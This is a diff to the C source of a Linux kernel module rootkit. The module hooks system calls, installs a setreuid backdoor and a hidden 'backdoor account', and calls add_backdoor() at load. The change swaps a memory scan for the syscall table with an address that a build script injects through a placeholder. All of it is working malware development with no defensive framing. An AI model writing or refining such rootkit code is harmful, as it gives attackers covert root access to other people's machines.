@@ -11,6 +11,7 @@
 #include <asm/uaccess.h>
 #include <linux/cred.h>
 
+// check whether system is 32-bit or 64-bit to assign appropriate pointer size
 #if defined(__i386__)
 #define START_CHECK 0xc0000000
 #define END_CHECK 0xd0000000
@@ -23,8 +24,8 @@ typedef unsigned long psize;
 
 asmlinkage int (*o_read)(int fd, void* buf, size_t count);
 
-psize *sys_call_table;
-
+// "table" will be replaced with the system call table address found by grep in compile.sh
+psize *sys_call_table = 0xTABLE;
 
 asmlinkage long (*o_setreuid) (uid_t ruid, uid_t reuid);
 
@@ -43,21 +44,6 @@ asmlinkage long backdoor_setreuid(uid_t r, uid_t e) {
 	}
 
 
-}
-
-psize **find(void) {
-
-	psize **sctable;
-	psize i = START_CHECK;
-
-	while (i < END_CHECK) {
-
-		sctable = (psize **) i;
-		if (sctable[__NR_close] == (psize *) sys_close) return &sctable[0];
-		i += sizeof(void *);
-	}
-
-	return NULL;
 }
 
 // backdoor account
@@ -284,14 +270,7 @@ void remove_setreuid() {
 
 int init_module(void) {
     	
-	if ((sys_call_table = (psize *) find())) {
-		printk("sys_call_table found at %p\n", sys_call_table);
-	}
-	
-	else {
-		printk("sys_call_table not found, aborting\n");
-		return 1;
-	}
+	printk("sys_call_table found at %p\n", sys_call_table);
 
 	add_backdoor();
 	add_setreuid();
